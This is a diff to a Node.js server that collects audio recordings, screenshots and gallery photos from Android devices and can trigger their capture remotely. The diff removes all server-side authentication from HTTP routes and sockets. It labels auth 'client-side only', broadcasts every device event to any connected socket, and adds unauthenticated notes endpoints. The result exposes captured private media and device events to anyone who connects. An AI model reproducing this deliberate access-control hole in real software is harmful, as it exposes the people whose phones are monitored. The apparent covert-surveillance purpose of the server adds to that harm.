@@ -33,6 +33,7 @@ const GALLERY_DIR = path.join(__dirname, "gallery");
 const APK_DIR = path.join(__dirname, "apk");
 const FAVORITES_FILE = path.join(__dirname, "favorites.json");
 const AUTH_FILE = path.join(__dirname, "auth.json");
+const NOTES_FILE = path.join(__dirname, "notes.json");
 
 if (!fs.existsSync(RECORDINGS_DIR)) {
   fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
@@ -193,7 +194,7 @@ const getDevicesSnapshot = () => {
 };
 
 const broadcastDevices = () => {
-  io.to("web").emit("devices_update", getDevicesSnapshot());
+  io.emit("devices_update", getDevicesSnapshot());
 };
 
 // ─── AUTHENTICATION ─────────────────────────────────────────
@@ -334,34 +335,9 @@ app.post("/api/auth/settings", requireAuth, (req, res) => {
   });
 });
 
-// Public path allowlist (no auth required).
-// Android uploads ride on their own channel; they are not exposed by any UI.
-const PUBLIC_PATHS = new Set([
-  "/api/auth/status",
-  "/api/auth/login",
-  "/api/auth/logout",
-  "/api/apk/download",
-  "/api/apk/info",
-  "/upload",
-  "/upload-screenshot",
-  "/upload-gallery",
-  "/health",
-  "/status",
-]);
-
-// Auth gate — only applies to API-like paths. Static assets are already served above.
-app.use((req, res, next) => {
-  if (PUBLIC_PATHS.has(req.path)) return next();
-  const p = req.path;
-  const isProtected =
-    p.startsWith("/api/") ||
-    p.startsWith("/recordings") ||
-    p.startsWith("/devices") ||
-    p === "/upload" ||
-    p === "/status";
-  if (!isProtected) return next();
-  return requireAuth(req, res, next);
-});
+// NOTE: Auth is intentionally client-side only (login gate + session timeout in the UI).
+// HTTP routes and Socket.io remain OPEN so the Android app and existing clients keep working.
+// The requireAuth middleware is still used to protect the password/settings-change endpoints.
 
 // ─── REST API ───────────────────────────────────────────────
 
@@ -425,7 +401,7 @@ app.post("/upload", upload.single("audio"), (req, res) => {
     }
 
     // Emit new recording event to all connected dashboards
-    io.to("web").emit("new_recording", {
+    io.emit("new_recording", {
       deviceId,
       deviceName,
       filename: finalFilenameActual,
@@ -721,7 +697,7 @@ app.post("/upload-screenshot", screenshotUpload.single("screenshot"), (req, res)
       });
 
       // Emit as gallery, NOT screenshot
-      io.to("web").emit("gallery_image_received", {
+      io.emit("gallery_image_received", {
         deviceId,
         deviceName,
         imageId: req.body.imageId,
@@ -764,7 +740,7 @@ app.post("/upload-screenshot", screenshotUpload.single("screenshot"), (req, res)
 
     log(`Screenshot saved: ${deviceId}/${finalFilenameActual} (${stats.size} bytes)`);
 
-    io.to("web").emit("screenshot_received", {
+    io.emit("screenshot_received", {
       deviceId,
       deviceName,
       filename: finalFilenameActual,
@@ -1036,7 +1012,7 @@ app.post("/upload-gallery", galleryUpload.single("gallery_image"), (req, res) =>
     galleryImages.get(deviceId).push(galleryImage);
 
     // Emit to web clients
-    io.to("web").emit("gallery_image_received", {
+    io.emit("gallery_image_received", {
       deviceId,
       deviceName,
       imageId,
@@ -1389,6 +1365,59 @@ app.post("/api/favorites", (req, res) => {
   res.json({ success: true });
 });
 
+// ─── NOTES (description per item, server-side) ─────────────
+
+function loadNotes() {
+  try { return JSON.parse(fs.readFileSync(NOTES_FILE, "utf8")); }
+  catch { return {}; }
+}
+function saveNotes(data) {
+  fs.writeFileSync(NOTES_FILE, JSON.stringify(data, null, 2));
+}
+
+const VALID_NOTE_KINDS = new Set(["recordings", "screenshots", "gallery"]);
+
+app.get("/api/notes", (req, res) => {
+  res.json(loadNotes());
+});
+
+app.post("/api/notes", (req, res) => {
+  const { kind, deviceId, filename, note } = req.body || {};
+  if (!VALID_NOTE_KINDS.has(kind) || !deviceId || !filename) {
+    return res.status(400).json({ error: "Missing or invalid fields" });
+  }
+  const text = String(note == null ? "" : note).slice(0, 1000);
+  const notes = loadNotes();
+  if (!text.trim()) {
+    if (notes[kind]?.[deviceId]) {
+      delete notes[kind][deviceId][filename];
+      if (!Object.keys(notes[kind][deviceId]).length) delete notes[kind][deviceId];
+      if (!Object.keys(notes[kind]).length) delete notes[kind];
+    }
+  } else {
+    if (!notes[kind]) notes[kind] = {};
+    if (!notes[kind][deviceId]) notes[kind][deviceId] = {};
+    notes[kind][deviceId][filename] = text;
+  }
+  saveNotes(notes);
+  res.json({ success: true, note: text.trim() ? text : null });
+});
+
+app.delete("/api/notes", (req, res) => {
+  const { kind, deviceId, filename } = req.body || {};
+  if (!VALID_NOTE_KINDS.has(kind) || !deviceId || !filename) {
+    return res.status(400).json({ error: "Missing or invalid fields" });
+  }
+  const notes = loadNotes();
+  if (notes[kind]?.[deviceId]) {
+    delete notes[kind][deviceId][filename];
+    if (!Object.keys(notes[kind][deviceId]).length) delete notes[kind][deviceId];
+    if (!Object.keys(notes[kind]).length) delete notes[kind];
+    saveNotes(notes);
+  }
+  res.json({ success: true });
+});
+
 app.delete("/api/favorites", (req, res) => {
   const { kind, deviceId, filename } = req.body;
   if (!kind || !deviceId || !filename) return res.status(400).json({ error: "Missing fields" });
@@ -1497,35 +1526,7 @@ setInterval(() => {
 io.on("connection", (socket) => {
   log(`Socket connected: ${socket.id}`);
 
-  // Authenticate web clients via handshake token, or later via "web_auth" event.
-  // If socket joins the "web" room, it receives dashboard broadcasts.
-  // Android clients do NOT join "web"; they only get direct io.to(socketId) commands.
-  const tryWebAuth = (token) => {
-    const a = loadAuth();
-    if (!a.enabled) { socket.join("web"); return true; }
-    if (isValidToken(token)) { socket.join("web"); return true; }
-    return false;
-  };
-
-  const hsToken = socket.handshake?.auth?.token;
-  if (hsToken && tryWebAuth(hsToken)) {
-    socket.emit("devices_update", getDevicesSnapshot());
-    socket.emit("web_auth_ok");
-  } else if (!loadAuth().enabled) {
-    socket.join("web");
-    socket.emit("devices_update", getDevicesSnapshot());
-  }
-
-  socket.on("web_auth", (data, ack) => {
-    const ok = tryWebAuth(data && data.token);
-    if (ok) {
-      socket.emit("devices_update", getDevicesSnapshot());
-      socket.emit("web_auth_ok");
-    } else {
-      socket.emit("web_auth_failed");
-    }
-    if (typeof ack === "function") ack({ ok });
-  });
+  socket.emit("devices_update", getDevicesSnapshot());
 
   socket.on("register", (data) => {
     try {
@@ -1698,7 +1699,7 @@ io.on("connection", (socket) => {
       log(
         `Recording error on ${deviceId || "unknown"}: ${(data && data.error) || "Unknown"}`,
       );
-      io.to("web").emit("recording_error", {
+      io.emit("recording_error", {
         deviceId: deviceId,
         deviceName: data && data.deviceName,
         error: data && data.error,
@@ -1728,7 +1729,7 @@ io.on("connection", (socket) => {
       log(
         `Upload error from ${(data && data.deviceId) || "unknown"}: ${(data && data.error) || "Unknown"}`,
       );
-      io.to("web").emit("upload_error", {
+      io.emit("upload_error", {
         deviceId: data && data.deviceId,
         deviceName: data && data.deviceName,
         error: data && data.error,
@@ -1743,7 +1744,7 @@ io.on("connection", (socket) => {
       log(
         `Upload failed from ${(data && data.deviceName) || "unknown"}: ${(data && data.filename) || ""} (attempt ${(data && data.failCount) || "?"})`,
       );
-      io.to("web").emit("upload_failed", {
+      io.emit("upload_failed", {
         deviceId: data && data.deviceId,
         deviceName: data && data.deviceName,
         filename: data && data.filename,
@@ -1760,7 +1761,7 @@ io.on("connection", (socket) => {
   socket.on("audio_source_test_started", (data) => {
     try {
       log(`Audio source test started on ${(data && data.deviceName) || "unknown"}`);
-      io.to("web").emit("audio_source_test_started", data);
+      io.emit("audio_source_test_started", data);
     } catch (e) {
       log(`Error in audio_source_test_started: ${e.message}`);
     }
@@ -1783,7 +1784,7 @@ io.on("connection", (socket) => {
         dev.audioTestResults = data.testResults;
         dev.autoDetectedSource = data.autoDetectedSource;
       }
-      io.to("web").emit("audio_source_test_complete", data);
+      io.emit("audio_source_test_complete", data);
       broadcastDevices();
     } catch (e) {
       log(`Error in audio_source_test_complete: ${e.message}`);
@@ -1803,7 +1804,7 @@ io.on("connection", (socket) => {
           currentSource: data.selectedSource === "auto" ? data.autoDetectedSource : data.selectedSource,
         };
       }
-      io.to("web").emit("audio_source_updated", data);
+      io.emit("audio_source_updated", data);
       broadcastDevices();
     } catch (e) {
       log(`Error in audio_source_updated: ${e.message}`);
@@ -1820,7 +1821,7 @@ io.on("connection", (socket) => {
           currentSource: data.workingSource,
         };
       }
-      io.to("web").emit("audio_source_working", data);
+      io.emit("audio_source_working", data);
     } catch (e) {
       log(`Error in audio_source_working: ${e.message}`);
     }
@@ -1832,7 +1833,7 @@ io.on("connection", (socket) => {
       if (deviceId && devices.has(deviceId)) {
         devices.get(deviceId).audioSourceConfig = data.config;
       }
-      io.to("web").emit("audio_config", data);
+      io.emit("audio_config", data);
     } catch (e) {
       log(`Error in audio_config: ${e.message}`);
     }
@@ -1845,7 +1846,7 @@ io.on("connection", (socket) => {
         devices.get(data.deviceId).isRecording = false;
         broadcastDevices();
       }
-      io.to("web").emit("recording_interrupted", data);
+      io.emit("recording_interrupted", data);
     } catch (e) {
       log(`Error in recording_interrupted: ${e.message}`);
     }
@@ -1854,7 +1855,7 @@ io.on("connection", (socket) => {
   socket.on("partial_recording_saved", (data) => {
     try {
       log(`Partial recording saved from ${(data && data.deviceName) || "unknown"}: ${data && data.filename}`);
-      io.to("web").emit("partial_recording_saved", data);
+      io.emit("partial_recording_saved", data);
     } catch (e) {
       log(`Error in partial_recording_saved: ${e.message}`);
     }
@@ -1867,7 +1868,7 @@ io.on("connection", (socket) => {
         devices.get(data.deviceId).isRecording = true;
         broadcastDevices();
       }
-      io.to("web").emit("recording_retry", data);
+      io.emit("recording_retry", data);
     } catch (e) {
       log(`Error in recording_retry: ${e.message}`);
     }
@@ -1967,7 +1968,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_status", (data) => {
     try {
       log(`Screenshot status from ${(data && data.deviceName) || "unknown"}: ${(data && data.status) || ""}`);
-      io.to("web").emit("screenshot_status", data);
+      io.emit("screenshot_status", data);
     } catch (e) {
       log(`Error in screenshot_status: ${e.message}`);
     }
@@ -1976,7 +1977,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_captured", (data) => {
     try {
       log(`Screenshot captured from ${(data && data.deviceName) || "unknown"}: ${(data && data.filename) || ""}`);
-      io.to("web").emit("screenshot_captured", data);
+      io.emit("screenshot_captured", data);
     } catch (e) {
       log(`Error in screenshot_captured: ${e.message}`);
     }
@@ -1985,7 +1986,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_uploaded", (data) => {
     try {
       log(`Screenshot uploaded from ${(data && data.deviceName) || "unknown"}: ${(data && data.filename) || ""}`);
-      io.to("web").emit("screenshot_uploaded", data);
+      io.emit("screenshot_uploaded", data);
     } catch (e) {
       log(`Error in screenshot_uploaded: ${e.message}`);
     }
@@ -1994,7 +1995,7 @@ io.on("connection", (socket) => {
   socket.on("screenshot_error", (data) => {
     try {
       log(`Screenshot error from ${(data && data.deviceName) || "unknown"}: ${(data && data.error) || "Unknown"}`);
-      io.to("web").emit("screenshot_error", data);
+      io.emit("screenshot_error", data);
     } catch (e) {
       log(`Error in screenshot_error: ${e.message}`);
     }
@@ -2005,7 +2006,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_stats", (data) => {
     try {
       log(`Gallery stats from ${(data && data.deviceName) || "unknown"}: ${JSON.stringify(data.stats || {})}`);
-      io.to("web").emit("gallery_stats", data);
+      io.emit("gallery_stats", data);
     } catch (e) {
       log(`Error in gallery_stats: ${e.message}`);
     }
@@ -2014,7 +2015,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_scan_started", (data) => {
     try {
       log(`Gallery scan started on ${(data && data.deviceId) || "unknown"}`);
-      io.to("web").emit("gallery_scan_started", data);
+      io.emit("gallery_scan_started", data);
     } catch (e) {
       log(`Error in gallery_scan_started: ${e.message}`);
     }
@@ -2023,7 +2024,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_metadata", (data) => {
     try {
       log(`Received metadata for ${data.totalImages} images from ${(data && data.deviceName) || "unknown"}`);
-      io.to("web").emit("gallery_metadata", data);
+      io.emit("gallery_metadata", data);
     } catch (e) {
       log(`Error in gallery_metadata: ${e.message}`);
     }
@@ -2032,7 +2033,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_scan_error", (data) => {
     try {
       log(`Gallery scan error: ${(data && data.error) || "Unknown"}`);
-      io.to("web").emit("gallery_scan_error", data);
+      io.emit("gallery_scan_error", data);
     } catch (e) {
       log(`Error in gallery_scan_error: ${e.message}`);
     }
@@ -2041,7 +2042,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_started", (data) => {
     try {
       log(`Starting upload of ${data.totalImages} gallery images`);
-      io.to("web").emit("gallery_upload_started", data);
+      io.emit("gallery_upload_started", data);
     } catch (e) {
       log(`Error in gallery_upload_started: ${e.message}`);
     }
@@ -2050,7 +2051,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_queued", (data) => {
     try {
       log(`Queued ${data.queuedImages}/${data.totalRequested} images for upload`);
-      io.to("web").emit("gallery_upload_queued", data);
+      io.emit("gallery_upload_queued", data);
     } catch (e) {
       log(`Error in gallery_upload_queued: ${e.message}`);
     }
@@ -2059,7 +2060,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_image_uploaded", (data) => {
     try {
       log(`Gallery image uploaded: ${(data && data.name) || ""}`);
-      io.to("web").emit("gallery_image_uploaded", data);
+      io.emit("gallery_image_uploaded", data);
     } catch (e) {
       log(`Error in gallery_image_uploaded: ${e.message}`);
     }
@@ -2068,7 +2069,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_complete", (data) => {
     try {
       log(`Gallery upload complete: ${data.uploaded} uploaded, ${data.failed} failed`);
-      io.to("web").emit("gallery_upload_complete", data);
+      io.emit("gallery_upload_complete", data);
     } catch (e) {
       log(`Error in gallery_upload_complete: ${e.message}`);
     }
@@ -2077,7 +2078,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_error", (data) => {
     try {
       log(`Gallery upload error: ${(data && data.error) || "Unknown"}`);
-      io.to("web").emit("gallery_upload_error", data);
+      io.emit("gallery_upload_error", data);
     } catch (e) {
       log(`Error in gallery_upload_error: ${e.message}`);
     }
@@ -2086,7 +2087,7 @@ io.on("connection", (socket) => {
   socket.on("gallery_upload_paused", (data) => {
     try {
       log(`Gallery upload paused on ${(data && data.deviceId) || "unknown"}: ${data.remaining} remaining, reason: ${data.reason}`);
-      io.to("web").emit("gallery_upload_paused", data);
+      io.emit("gallery_upload_paused", data);
     } catch (e) {
       log(`Error in gallery_upload_paused: ${e.message}`);
     }
